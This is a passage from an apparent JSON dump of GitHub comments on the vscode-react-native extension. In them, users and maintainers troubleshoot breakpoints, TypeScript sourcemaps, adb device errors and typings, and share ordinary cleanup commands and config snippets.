the index.ios.bundle items, launchEditor.js finds the workspace and passes 2 args when launching the editor (workspace and actual file with line number).\nHowever for vm.js, appWorkder.js, q.js which are outside of the project root, it just passes 1 arg (for instance /Users/jean/.vscode/extensions/vsmobile.vscode-react-native-0.1.5/out/debugger/appWorker.js:76).\nSee\n\n. Looks like you fixed it: https://github.com/facebook/react-native/commit/7dbc8051e5eec12db4d98fe658167c522c6d8275\nRight? \ud83c\udf89 \n. ",
    "antoinerousseau": "Also, make sure you have installed the command:\nhttps://code.visualstudio.com/docs/setup/mac. ",
    "ramintagizade": "same problem . ",
    "wprater": "Im seeing this crop up again in RN 0.50.3\n. ",
    "alfonsogarciacaro": "Great, thanks for the tip! Of course it'll be much better if VS Code could recognize the breakpoint in the F# source file, but I'll give it a try to the hack and confirm if it's working.\nThanks again for taking the time to look into this issue!\n. Hi @jicongw! Sorry, I kinda forgot about this \ud83d\ude05 \nI just followed your kind instructions above: edited ~/.vscode/extensions/vsmobile.vscode-react-native-0.1.6/package.json and restarted VS Code (I already have the fsharp extension installed) but unfortunately the result is still the same. Even if I set the break point in fableLib.fsx the debugger stops in index.android.bundle \ud83d\ude15 \n. Thanks for the detailed information, @jicongw. I don't have an \"attach to packager\" target in my launch.json. Could you please post the configuration here?\n. Fantastic, it's working! :clap:\nOf course, it'd be much better if the whole process could be automated, but it's a great start :) Thanks a lot for your help!\n. ",
    "kulmajaba": "Thanks for the answer. Yes, previously I've modified both the packager port and set a custom port on the device. This has been the way I've done it until the latest update.\nNow that you said it, I left the device to the default port of 8081 and everything worked fine. I still get Could not connect to BatchedBridge on initial run of a freshly installed app,  but I think that's not from VSCode React Native. In any case reloading the app fixes that issue.\nI guess the original issue was actually just a misunderstanding on my part. Still, I think the behavior of setting a custom port for the packager should be explained in the docs as it might not be clear to everyone (like me).\n. ",
    "jpgarcia": "6.2.0\nEl mi\u00e9rcoles, 31 de agosto de 2016, Chance An notifications@github.com\nescribi\u00f3:\n\nCan you help check what Node version you are on?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/297#issuecomment-243841275,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAFzhemikMTIZmsZiIBv-ikGHkdveu0wks5qlbvzgaJpZM4Jxne7\n.\n. \n",
    "Cal-L": "Yep, I have react-native 0.32 installed and it is listed as a dependency in package.json. In my terminal, lowercase -v is not recognized but react-native -V does work and displays 0.32.\n. Good catch! It looks like I had node_modules/.bin in my path. Thank you.\n. ",
    "preetb123": "OS X EI Capitan v.10.11.3 \nVSCode: v. 1.5.3. I also use insiders build but not working their as well.\nvscode-react-native: 0.2.0\nYes. I did restart vscode after updating the extension.\n. Please let me know what specific information you need to repro this. \n. @mbraude this is working in the latest release of code. But for code-insiders, after installing and running app on device, following error occurs\n```\n[vscode-react-native] Finished executing: adb -s emulator-5554 shell am broadcast -a \"com.hellorn.RELOAD_APP_ACTION\" --ez jsproxy true\nnode --debug-brk=48593 --nolazy launchReactNative.js 9090 \nDebugger listening on [::]:48593\n[vscode-react-native] Starting debugger app worker.\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n[vscode-react-native] [Error : 0706]  Cannot debug application: Another debugger is already connected to packager. Please close it before trying to debug with VSCode.\n```\n@MSLaguana cmd+shift+p -> React Native: start packager starts the packager now and works fine, didn't try it that time. I used to use npm start from terminal\n. ",
    "josemigallas": "\nVSCode 1.24.1\nReact Native Tools 0.7.0\n\nI'm still experiencing this error, only the values are shown:\n\n\n. ",
    "HaloWang": "I create a function to fix this problem temporarily\n```typescript\nimport { ViewStyle, TextStyle, ImageStyle } from 'react-native'\n/\n * Quick Style\n \n * related issue\n * @see https://github.com/Microsoft/vscode-react-native/issues/306\n * @see https://github.com/Microsoft/TypeScript/issues/29180\n * @see https://github.com/Microsoft/TypeScript/issues/28470\n \n * Marco? $\n * @see https://github.com/Microsoft/TypeScript/issues/4892\n \n * @todo ViewStyle | TextStyle | ImageStyle no work\n *  /\ntype _QS = ViewStyle & TextStyle & ImageStyle\nexport function $(style: _QS) {\n  return style\n}\n```\nusage\ntypescript\nconst styles = StyleSheet.create({\n  item: $({\n    position: 'relative',\n    overflow: 'visible',\n  }),\n})\nAnd it works\n\n\ud83d\ude02. ",
    "Crash--": "Nice catch. I just removed an extension with Flow support and now it works! \nThanks @girvo \n. I'm using the Version 1.5.3 (1.5.3). \nI'll report to the vscode repo\n. ",
    "faisalil": "any update on this?\n. ",
    "ryanjsalva": "@faisalil see http://reactnative.tools\n. Opt-out seems like the right way to go.\n. ",
    "cubabit": "The link is now dead - is there another place I can see this?. ",
    "satya164": "Would be perfect for my use case. Thank you. Loving VSCode!\n. ",
    "alsorokin": "@MSLaguana @panarasi do you think settings.json would be a better place for such an option? Because we would need it at extension activate time and not at debugger launch time?\n. This workspaceRoot variable actually is pointing at project root. I'll rename it. Thanks for noticing this inconsistency!. Well yes, I guess the entry point is still in root/.vscode/\nIf that is not the right place for it to be and we put it to root/project/.vscode, then the user would need to manually edit program arg in launch.json.\nCurrently it looks like this:\n{\n<...>\n    \"configurations\": [\n        {\n            ...\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            ...\n        }]\n<...>\n}\nAnd as far as I know we can't really use any other variable other than $workspaceRoot here so we don't have any convenient way to point to project root.. Tried it and it doesn't seem to work \ud83d\ude1e . I've moved the exponentIndex.js file back to root/.vscode folder as you suggested, so this path should be correct.\nI've tested it with Exponent and it works.\nSee https://github.com/Microsoft/vscode-react-native/pull/359/commits/f6b41bbfd0a8c1ada2fbcba69f0c37e99ad46369. ",
    "haitaoli": "I would like to have this feature too. In my project the main RN code is in a sub directory, and there are a bunch of js files in another directory. I mostly need debugger support because I have to run the packager separately. With atom/nuclide I can add multiple folders into the project so that's not a problem. But VSCode doesn't support that.\n. ",
    "softAlexs": "Me too\n. \u6211\u4e5f\u9047\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u7528typescript\u53ef\u4ee5\u7ed3\u5c40\uff0c\u4f46\u662f\u9700\u8981\u624b\u52a8\u5b89\u88c5@types/react-native\n. ",
    "Richard-Cao": "@MSLaguana JavaScript, no JavaScript React.  I am sure referenced import { AppRegistry } from 'react-native';\n. @MSLaguana My tsconfig.json\uff1a\n{\n    \"compilerOptions\": {\n        \"allowJs\": true\n    },\n    \"exclude\": [\n        \"node_modules\"\n    ]\n}\nDo not have jsconfig.json.\n. exist\u2026\u2026\n. ",
    "huohuoluo": "just copy srcRootDir/.vscode/typings  to  srcRootDir/typings , and it works.\ndon't know why, but work.\n. ",
    "lucaotta": "I've created a new project with\nreact-native init foobar\ncd foobar\ncode .\nand the extension is not working. It's not even recognizing that the language is Javascript React.\nMy tsconfig.json is\n{\"compilerOptions\":{\"allowJs\":true},\"exclude\":[\"node_modules\"]}\nI've tried the following from the project root:\n- cp -R .vscode/typings .vscode/react;\n- cp -R .vscode/typings .\n- cp -R .vscode/typings .vscode/.react (no dice, vscode will delete it);\nI don't have a .vscode/react/typings but I have .vscode/typings/react-native/react-native.d.ts\nOh, by the way, the README still mentions VSCode 0.11, which seems just a little outdated since we are at 1.6.\n. By the way, I've managed to have auto completion by installing the \"Typings\" extension as described in this blog post: https://medium.com/react-weekly/react-native-and-typescript-ad57b7413ead#.lqkkadkkt\nI'm just starting with this technology, so bear with me if I'm doing a bit of cargo-culting... :)\n. ",
    "TimBarham": "Great find, @daserge! I looked at the vscode source and can confirm your findings, that the call to deactivate() expects a promise be returned (though I couldn't find it documented anywhere).\nMy only comment would be that I think it would be preferable to Q.Promise() rather than the Q specific Q.defer, as in:\njs\nexport function deactivate(): Q.Promise<any> {\n    return Q.Promise(function (resolve) {\n        // Kill any packager processes that we spawned\n        entryPointHandler.runFunction(\"extension.deactivate\",\n            ErrorHelper.getInternalError(InternalErrorCode.FailedToStopPackagerOnExit),\n            () => {\n                commandPaletteHandler.stopPackager().done(() => {\n                    // Tell vscode that we are done with deactivation\n                    resolve();\n                });\n            }, /*errorsAreFatal*/ true);\n    });\n}\nAlso, I don't believe you need to pass any value with the resolve() call.\n. Can't you just declare this method as returning Q.Promise<void>? There doesn't seem to be any requirement on the vscode side for the promise to resolve to a value.\n. \"same name of your app\" should be \"same name as your app\" or \"name of your app\"\n. Nit: Isn't the \"?:\" superfluous here (doesn't array.join return an empty string for an empty array)?\n. Hah, nope, that's fine :smile: \n. I'm not sure I understand why these are included in .vscodeignore?\n. Ah. So how are the samples used?\n. So you still have to specify a parameter even though the promise type is void? That's annoying. Personally I'd pass null rather than undefined though (that seems to be the most common trend in the vscode source too).\n. Can you clarify what this change was needed for?\n. I saw both were used, but null just seemed cleaner \ud83d\ude04 \n. Ah, fair enough.\n. Fair enough.\n. ",
    "daserge": "Thanks Tim!\nI've addressed the comments.\nRegarding the resolve argument - it is required according to the typings:\nhttps://github.com/Microsoft/vscode-react-native/blob/61c4db14ec615d4eb5ada64fc869385489315d29/src/typings/q/Q.d.ts#L278\n. @TimBarham - thanks!\nUpdated to Q.Promise<void>.\n. This is fixed in #338, please close.\n. Thanks @MSLaguana, I've reworked this in #338\n. @MSLaguana, could you please review?\n. See https://github.com/Microsoft/vscode-react-native#customization\n```\nTo specify a subfolder in which the react-native project is located, set react-native-tools.projectRoot. You can use either absolute or relative path here:\n{\n  \"react-native-tools\": {\n    \"projectRoot\": \"./your/react-native/project\"\n  }\n}\n``. Looks like [void 0](https://github.com/Microsoft/vscode-react-native/search?utf8=%E2%9C%93&q=resolve%28void+0%29&type=Code) is used for this case - what do you think?\n. It was needed to exclude test artifacts from tslint checks.\n. Updated tovoid 0` as it seems to be more commonly used in this repository.\n. ",
    "liupeng5843": "i got the same issue,how to fix it . ",
    "sergey-akhalkov": "Hi @liupeng5843, thanks for reaching us, could you please create new issue and provide us as much info as possible so we would be able to help you faster?. Hi @chenzhiyuan0402, sorry for the reeeally delayed repsonse, could you please let me know if the issue still has place for you, if so could you please update your software and issue template with the new one if possible?. Hi @boguscoder, I'm closing this for now, please feel free to reopen or create new one if you have any updates.. Hi @MrHubble, sorry for the delayed response, does this issue still have place for you?. Hi @redlock, please let us know if the issue still has place for you and if you have a chance to take a look at the message above.. Hey guys, I'm closing this for now, please feel free to reopen or create new one if the issue still has place for you. Please also provide us as much info as possible so we would be able to reproduce and fix this.. Hi @garciawarneckee, just a friendly ping, please let me know if the issue still has place for you and if you have a chance to take a look at the message above.. @garciawarneckee, I'm closing this for now, please feel free to reopen or create new one if you have any updates.\n@jpsouzasilva, sorry for the delayed response, I'm closing this issue, so could you please create new one if the issue still has place for you and share your problem and environment there?. @matthew-an, docs have been updated, thanks for the feedback!. Hi @rodrigoelp, just a friendly ping.. Closing this, please free to reopen if you have any updates.. Hey guys, thanks for reaching us and sorry for the delayed response. We are going to investigate it asap and let you know if we have any questions or updates.. Hi @novellizator, yes, it would be great, because I've just tried to debug my iOS test app - it works as expected without any issues and I was able to debug my code. Going to verify on Android and then switch to Windows. Currently, my environment is the same as in this issue:  https://github.com/Microsoft/vscode-react-native/issues/630\nHere is my test app: https://github.com/sergey-akhalkov/vsrn625\nissue625.zip\nSo could you guys please share with us your exact environment and provide a minimum working version of your code where the issue reproduces?. Hi @edmundito, thanks for sharing the info!\n\ninternalDebuggerPort\n\nHm, I have not touched it at all and it works just as it is.\n\nThe \"Debugger worker\" port seems to be changing on every run.\n\nThe same is for me, so I don't think if it's a root cause, so I'm still trying to reproduce the issue.. Hi @novellizator, could you please confirm - do I get it right that the issue has place since the new version of VSCode 1.20.0 or you have seen it before?. @novellizator, here is https://code.visualstudio.com/updates/v1_20 \nFor older version of VSCode you can found download links there, please let me know if you need anything else.. >are you sure there any any download links?\nyeah, here is \n\nHere is the link for Mac download (verions 1.19) https://vscode-update.azurewebsites.net/1.19.3/darwin/stable. @novellizator, got it, thanks, it's useful info. So could you please confirm if the issue reproduces on the demo app I've sent here https://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-366719491? If so, could you please let me know what the line of the code you are setting a breakpoint to?. @novellizator, gotcha :)\nPlease let me know if the issue will happen for you again. I'm going to try one more thing but I'm still looking for reproducible demo / repro steps.. Hey guys, I've tried to reproduce the issue both for Android and iOS on macOS but with no luck. So I need your help to figure out what goes wrong. Could you please answer the following questions to make things clear:\n1. Are you using TypeScript in your project?\n2. Does the issue reproduces on the test app I've provided here https://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-366719491 If not, please provide us a minimum working version of your app. @dancomanlive, could you please share the link to your app where the issue reproduces?\n3. What OS are you using: macOS, Windows?\n4. Does this issue have a stable repo? If so, could you please provide repro steps?\n5. What launch configuration are you using, default or custom?\n6. Have you ever seen this issue before VSCode version 1.20 or it reproduces for 1.20 only?\n7. What version of react-native-cli are you using?\n8. Please share exact version of your software you are using for development from this issue template\n9. Could you please try to reinstall VSCode to see if the issue still has place?. @novellizator, thank you! Waiting for clarification from the others, just trying to find any leads that can help me to reproduce the issue.. Hey guys, thank you so much for sharing all the info. I've found 2 things (while debugging vsrn625 I've provided previously) that really worrying me:\n1. your vscode-chrome-debug-core version is 3.18.5, but mine is 3.23.0\n2. your rootTag in appParams is 31, but mine is 11\nSo guys could you please totally remove React Native tools using this command rm -rf ~/.vscode/extensions/vsmobile.vscode-react-native-0.5.7/ and then install it again (please install the lates version 0.6.1) to see if you have the same vscode-chrome-debug-core version and the same rootTag number?\nPlease let me know if you have any updates.. Hi @Sler69, @f4z3k4s, could you please let me know what is your version of vscode-chrome-debug-core (you can check it in debug console)? \nIf this module has version 3.18.5 - please try to reinstall your extension as I've described here and let me know if the issue still has place for you.. Hey guys, I was able to reproduce it:\n1. Completely remove RN Tools Extension with all its dependencies from VSCode\n2. Install it again \n3. Debug iOS\nThe debugging actually works when I reset one of the debug breakpoints, but it's actually annoying. So I'm going to investigate the root cause of the issue and let you know if I have any updates.. Hi @Gremlin80, \n\nbreakpoints does not work at all\n\nHmm, please let me clarify which way I was able to reproduce the issue:\n1. Set up breakpoints\n2. Launch Debug iOS\n3. Got \"Breakpoint set but not yet bound\" messages\n4. Reset one of the breakpoints (just click twice on it)\n5. Debugging works again\nHere is the demo: \n\nSo guys, could you please let me know if all of you are experiencing the same issue and if debugging works as expected after resetting breakpoints?\nAs of now I'm working on fix that should allow to avoid of breakpoints resetting (avoid/remove step 4)\n. Hi @novellizator, have you tried to reset your breakpoints (remove and add them again)? Please let me know if it works or not because I believe that you probably have another issue.\nGoing to verify the Archive you've sent to me.. Hey guys, just a quick update - I've created an issue here https://github.com/Microsoft/vscode-chrome-debug-core/issues/293 for a breakpoints activation issue (on first debug session) I've described previously, hope they'll be able to respond soon and share their ideas regarding this so we'll be able to fix this issue much faster.\nAs of now the only way to bypass the issue - is to use a workaround I've described previously - reset one of the breakpoints by removing and adding it again.. Hey guys, just want to provide a quick update regarding this issue and also clarify several things:\n1. The issue we are talking about in this thread is described here https://github.com/Microsoft/vscode-react-native/issues/625#issuecomment-368421380 and if you have another repro - please create new issue. Currently we are collaborating with the vscode-chrome-debug-core team and seems like the root cause of the issue is in ms-vscode.node-debug2 - we are working on this.\n2. @yakimka, the issue you are talking about should be related to this one https://github.com/Microsoft/vscode-react-native/issues/660, @max-mironov already has provided an update regarding this - the issue is in Metro bundler and I think fix should be shipped soon ( 0.54.2 or so )\n3. If you are unable to hit breakpoint in other cases (not related to 1st-2nd points) - please make sure you are familar with the following items https://github.com/Microsoft/vscode-react-native#known-issues ; https://github.com/Microsoft/vscode-react-native/blob/master/doc/debugging.md ; https://github.com/Microsoft/vscode-chrome-debug#my-breakpoints-arent-hit-whats-wrong otherwise please create separate issue and provide us as much info as possible.. Hi @novellizator, thanks for reaching us and for filling the issue details. I'm closing this as duplicate of https://github.com/Microsoft/vscode-react-native/issues/625 , so please let's have a discussion in the one common issue.\nPlease let us know if you have any questions or see any other issues.. Hi @leejones45, sorry for the delayed response and thanks for reaching us. Could you please take a look at https://github.com/Microsoft/vscode/issues/5214#issuecomment-304566827 and let me know if it helps?. Hi @G3z, we've fixed this issue in https://github.com/Microsoft/vscode-react-native/releases/tag/0.6.1\nSo I'm closing this issue, please feel free to reopen if the issue still has place of if you have any questions.. Hi @booker-laputa, thank you for reaching us and for the issue details, we are going to investigate it and let you know if we have any questions/updates.. Hey guys, closing this, please feel free to reopen if it makes sense to you.. ",
    "atlanteh": "I did clean the ios/build folder and it doesn't seem to solve the issue..\n. I changed what u said and also changed the Scheme name and this solved the issue.\nThx!\n. ",
    "ForteenC": "@MSLaguana Thanks ,I solved this problem by restart my  computer,it was because the port 8081 been occupied ,and now it's doing well.\n. ",
    "roblourens": "Where are you missing intellisense? Can you give a code example?\n. Are you using the react native extension? Is it a bug on their end? I think they try to get typings automatically somehow.\n. From @Mirodil on October 19, 2016 13:7\nI checked again in freshly created sources as described above. if you open any file inside app folder, for instance app/components/AlertMessage.js and try to get IntelliSense for react.\n. I don't think intellisense is supposed to work out of the box in vscode for JS so I'm moving this to react-native.\n. After it attaches to Chrome, it downloads the sourcemaps and parses them as they come in, and if they are large, this could take time. I'm not aware of any random time wastage but maybe it could be optimized.. I can't tell what's going on in the profile. It attaches as quickly as possible, it isn't waiting for anything.. LGTM. You may want to follow this issue - https://github.com/Microsoft/vscode/issues/19650 - as we're talking about how the two debug adapters will interact in the future. It probably won't mean anything for you, at least for February. There's a chance they could end up merged into a single extension or something, but probably not.. Ping @MSLaguana, @vladimir-kotikov?. ",
    "Mirodil": "this file did not help, the project has 2 typings folders, in the root and in the .vscode. for install typings this commands typings install dt~react --global --save and typings install dt~react-native --global --save have been used.\n. after update vscode to latest version and installations typings it works with or without react-native\n. yes, it works. the problem is when you import react from lib like this import React from 'react' in this case IntelliSense does not show correct suggestions, if you remove this line, it works like a charm. \n. ",
    "Ruzo": "Works fine with Genymotion simulator.\n. C:\\Users\\Richard>adb devices\nList of devices attached\n192.168.1.168:5555      device\n. Also works fine with the device attached.\n. No issues with a simulator on the same machine and a physically attached device.\nIt only has an issue when my device is connected through tcpip.\n. Don't know if it's related but, from time to time after launching VScode, I see an error message in the output: \"Failed to setup the stub launcher for the debugger\". It doesn't show up every time.\n. Still the same error with the \"target\" property inserted in \"Debug Android\" task in launch.json. Actually, the phone does not connect at all to the server when I make that change.\nThanks for trying to help but I have a feeling that it's my own private little bug with adb. For some reason, only part of the Debug console output could be pasted to my description but I now can see an error at the beginning of the build which is:\nRunning C:\\Users\\Richard\\AppData\\Local\\Android\\sdk/platform-tools/adb -s 192.168.1.168:5555 reverse tcp:8081 tcp:8081\nerror: more than one device/emulator\nCould not run adb reverse: Command failed: C:\\Users\\Richard\\AppData\\Local\\Android\\sdk/platform-tools/adb -s 192.168.1.168:5555 reverse tcp:8081 tcp:8081\ntrying the \"adb -s 192.168.1.168:5555 reverse tcp:8081 tcp:8081\" command in a Command Prompt gives the same \"error: more than one device/emulator\"\n. @gmaliandi, still the same for me. I thought it had to do with Genymotion because of VirtualBox but that wasn't it. Does it have to do with Samsung's driver since I'm using a Note 4? I'm waiting for my pixel to know for sure.. @vladimir-kotikov yes, through network with host IP and port entered in Dev settings. It worked before, not sure what happened. Did not try it since though.. ",
    "gmaliandi": "Exact same problem here. Running adb -s 192.168.0.100:5555 reverse tcp:8081 tcp:8081 always gives \"error: more than one device/emulator\".. ",
    "DFelten": "Same error here if I try to run on a device without cable:\ncd C:\\Users\\Daniel\\AppData\\Local\\Android\\sdk\\platform-tools\nadb tcpip 5555 && adb connect 192.168.1.129:5555\nreact-native start\nreact-native run-android\nCould not get BatchedBridge, make sure your bundle is packaged correctly.\n[Error : 0104]  Failed to run the application in Android: error: more than one device/emulator\nadb devices\nList of devices attached\n192.168.1.129:5555      device. Thanks, after defining the IP and my port it's working :). ",
    "careergod": "same problem here , \nerror: more than one device/emulator\nCould not run adb reverse: Command failed: /Users/Macbookpro2/Library/Android/sdk/platform-tools/adb -s 10.61.147.228:8081 reverse tcp:8081 tcp:8081. ",
    "Nermin-K": "Are there any other solutions?! I have tried everything above and nothing helps. I have stuck there for 4 days. . ",
    "khat33b": "\n@DFelten, if you want to debug over wi-fi, make sure that you have specified your debug host IP and port in app's Developer menu -> Dev settings -> Debug server host & port\n\n@vladimir-kotikov How to do this for Android TV?. ",
    "kidtsunami": "Here's the repo that I have been using to try this extension out.\nhttps://github.com/kidtsunami/TypescriptTest4\n. ",
    "owenyang0": "same case, waiting for the solution.\n. ",
    "joeferraro": "We have followed the steps in https://github.com/Microsoft/vscode-react-native/issues/328#issuecomment-259699039 and have never gotten this to work.. Sure, will try to do so this week @kidtsunami . ",
    "UppaJung": "I've been having the same problem with breakpoints not getting set because mappings are lost.  @pawsong found a workaround.  Set tsconfig.json to use inlineSourceMap instead of sourceMap.\n//\"sourceMap\":true,\n    \"inlineSourceMap\": true,. ",
    "muccy": "Hi, inlineSourceMap + sourceRoot worked until I upgraded to React Native 0.42 this morning. Now breakpoints aren't hit anymore. I also tried to force a fresh install with this script:\nrm -rf $TMPDIR/react-* && watchman watch-del-all && npm cache clean && rm -rf ios/build/ModuleCache/* && rm -rf node_modules/ && rm -rf build && npm install\nNo success.. ",
    "saeedtabrizi": "@vladimir-kotikov Same problem reported by @muccy . . @vladimir-kotikov  , is there any update or trick to solve problem urgently.. Hi @vladimir-kotikov \nIf typescript debugging configuration changed so please add an example project for the true configuration.\nThanks. @seyaobey the same problem here :(. @vladimir-kotikov\n Forever trusting who we are\nAnd nothing else matters .. ",
    "ambientlight": "@vladimir-kotikov Probably makes sense adding the note about it into README until resolved. @vladimir-kotikov which implies we need to stick with 0.41.2 for some time now?. @vladimir-kotikov Thanks for the suggestion. . @vladimir-kotikov so 0.4.0, 0.4.1 is out. I have update react native from latest working for me - 0.41.2 to 0.47.0.\nBreakpoints not working for me now. (i was pretty excited) \nIs there anything I should change in the project?\nI have also tried removing .vscode and regenerating the launch.json and related from F5.\nResulting index.ios.js contains the expected (i guess) source map link:\n//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiaW5kZXguaW9zLmpzIiwic291cmNlUm9vdCI6Ii9Vc2Vycy9odXJkZW4vRGV2ZWxvcGVyL2xlYW4vY29kZS9CYWxsY2FzdC9tb2JpbGUvc3JjLyIsInNvdXJjZXMiOlsiaW5kZXguaW9zLnRzeCJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTs7OztHQUlHO0FBRUgsT0FBTyxLQUFLLEtBQUssTUFBTSxPQUFPLENBQUE7QUFHOUIsTUFBTSxFQUFDLFNBQVMsRUFBQyxHQUFHLEtBQUssQ0FBQTtBQUN6QixPQUFPLEVBQ0gsVUFBVSxFQUNWLElBQUksRUFDSixJQUFJLEdBQ1AsTUFBTSxjQUFjLENBQUE7QUFVckIsTUFBTSxDQUFDLE9BQU8sVUFBVyxTQUFRLFNBQXVCO0lBQ3BELE1BQU07UUFDRixPQUFPLENBQUMsR0FBRyxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQ3JCLE9BQU8sQ0FBQyxHQUFHLENBQUMsT0FBTyxDQUFDLENBQUM7UUFFckIsTUFBTSxDQUFDLENBQ0gsQ0FBQyxJQUFJLENBQUMsS0FBSyxDQUFDLENBQUMsTUFBTSxDQUFDLFNBQVMsQ0FBQyxDQUMxQjtnQkFBQSxDQUFDLElBQUksQ0FBQyxLQUFLLENBQUMsQ0FBQyxNQUFNLENBQUMsSUFBSSxDQUFDLENBQ3JCOztnQkFDSixFQUFFLElBQUksQ0FDVjtZQUFBLEVBQUUsSUFBSSxDQUFDLENBQ1YsQ0FBQztJQUNOLENBQUM7Q0FDSjtBQUVELE1BQU0sTUFBTSxHQUFHLFVBQVUsQ0FBQyxNQUFNLENBQUM7SUFDN0IsU0FBUyxFQUFFO1FBQ1AsSUFBSSxFQUFFLENBQUM7UUFDUCxjQUFjLEVBQUUsUUFBUTtRQUN4QixVQUFVLEVBQUUsUUFBUTtRQUNwQixlQUFlLEVBQUUsU0FBUztLQUNoQjtJQUVkLElBQUksRUFBRTtRQUNGLFFBQVEsRUFBRSxFQUFFO1FBQ1osU0FBUyxFQUFFLFFBQVE7UUFDbkIsTUFBTSxFQUFFLEVBQUU7S0FDQTtDQUNqQixDQUFDLENBQUMifQ==\ntsconfig.json\n```json\n{\n    \"compilerOptions\": {\n        \"target\": \"es2015\",\n        \"jsx\": \"react-native\",\n        \"outDir\": \"build\",\n        \"rootDir\": \"src\",\n        \"allowSyntheticDefaultImports\": true,\n        \"noImplicitAny\": true,\n        \"strictNullChecks\": true,\n        \"experimentalDecorators\": true,\n        \"preserveConstEnums\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"inlineSourceMap\": true,\n    \"sourceRoot\": \"src\"\n},\n\n\"files\": [\n    \"src/index.android.tsx\",\n    \"src/index.ios.tsx\"\n],\n\"compileOnSave\": true\n\n}\n```\n.babelrc\njson\n{\n  \"presets\": [\n    \"react-native\"\n  ],\n  \"plugins\": [],\n  \"sourceMaps\": true\n}\n.vscode launch.json hasn't been unchanged except added tsc prelaunch task.\nDebugging will produce the expected output in console:\n[vscode-react-native] Finished executing: react-native run-ios --simulator iPhone 5s --project-path ios\n[vscode-react-native] Starting debugger app worker.\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application. @vladimir-kotikov ignore it. \nWorks for me on 0.42.0 and a bit later on 0.47.1...\nMigrating RN was a bit tricky... confused me initially. . ",
    "alloy": "@vladimir-kotikov FWIW, the performance drawbacks have been negligible during iterative development. I think it was noticeable in a clean (uncached) build, but haven\u2019t performed any profiling.. ",
    "MartinWebDev": "Any updates on this?\nI am getting increasingly angry at react-native. My impression so far it's that it's one of the hardest things on earth to debug! Haha. Why is a simple solution so hard to find :(. ",
    "Tableau-David-Potter": "I've seen several statements to follow the recommendations at http://www.reactnative.tools/tutorials/2016/09/20/reactnative-ts/.  That page suggests executing this command:\nreact-native start --transformer node_modules/react-native-sm-transformer\nI don't ever use that command in my current workflow.  I use this commands:\nreact-native run-ios\nreact-native run-android\nHow does that article help solve the problem of debugging a React Native app in TypeScript?. ",
    "lukewlms": "Confirmed TS debugging appears to be totally broken in React Native.  Could not get sourcemaps working on the ReactNativeTS project referenced by @vladimir-kotikov.\nThis thread can probably be closed until (we hope) the relevant RN repo issue is resolved.. @vladimir-kotikov TS debugging with React Native is broken till the relevant React Native issue is resolved, correct?  It doesn't appear to me there are any current viable workarounds.. There's an open thread on this under the Expo repo:\nhttps://github.com/expo/expo/issues/37. @markmadlangbayan @mindrage recommend following this RN issue .  TS debugging is currently broken.. @vladimir-kotikov Thank you, that's exciting!. ",
    "iShawnWang": "Still not work, any update or docs ?\nThanks ~. 1. It seems that his was released in `React Native Tools v0.4.1' : Fixed bug in typescript sourcemaps rewrite logic when project and vscode are on different drives; \n2. but it seems not work, the VSCode still prompt something wrong with SourceMap and I have try to solve it by follow some github issues, still not work. \n3. where can I find some docs about how to config it properly ~ Thanks\n:D.",
    "Marco62": "The problem was in the emulator settings, first I switch it in developer mode (Settings->About phone then hitting 10 times on Build Number):\n\nThen hit Ctrl-M when the app is in foreground for showing development Menu, then chose Dev Settings and enable JS minify option:\n\nAfter this when I run Debug Android from VS Code the debugger was able to stops on enabled breakpoints\n. ",
    "vonweb": "@vladimir-kotikov node  is v6.9.1, and I cloned from https://github.com/mrpatiwi/ReactNativeTS, breakpoint is set at src/components/HelloWorld/index.tsx:30\nwhen debugging with generated js vscode cannot catch either\nat first the bundle map is not target to tsx, I changed sourceMap to inlineSourceMap in tsconfig.json\n. thanks for your reply, I tried node v4.6.2, with react-native-cli: 1.2.0, react-native: 0.37.0 but I run into some other problems.\nin debug console I get:\n[vscode-react-native] [Warning] Failed to prepare the JavaScript runtime environment. Message:\n[object Object]. Debugging won't work: Try reloading the JS from inside the app, or Reconnect the VS Code debugger: Block-scoped declarations (let, const, function, class) not yet supported outside strict mode\nin vscode console I get:\n[Extension Host] processWorkspaceFiles Array[4]0: Object$mid: 1authority: \"\"external: \"file:///e%3A/WorkSpace/myTsRnProject/src/declarations.d.ts\"fragment: \"\"fsPath: \"e:\\WorkSpace\\myTsRnProject\\src\\declarations.d.ts\"path: \"/e:/WorkSpace/myTsRnProject/src/declarations.d.ts\"query: \"\"scheme: \"file\"proto: Object1: Object2: Object3: Objectlength: 4__proto__: Array[0] true false\nshell.ts:440Node.js \u672a\u5728\u5408\u7406\u7684\u65f6\u95f4\u5185\u54cd\u5e94\u8bf7\u6c42\u201clistbreakpoints\u201d\u3002: Error: Node.js \u672a\u5728\u5408\u7406\u7684\u65f6\u95f4\u5185\u54cd\u5e94\u8bf7\u6c42\u201clistbreakpoints\u201d\u3002\n    at file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:87:15727\n    at Object.v as _notify\n    at Object.enter (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:31:14302)\n    at _run (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:31:15623)\n    at _error (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:31:15140)\n    at file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:82:21162\n    at t.e.dispatch (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:82:22507)\n    at t.e.handleData (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:82:22019)\n    at Socket. (file:///C:/Program Files (x86)/Microsoft VS 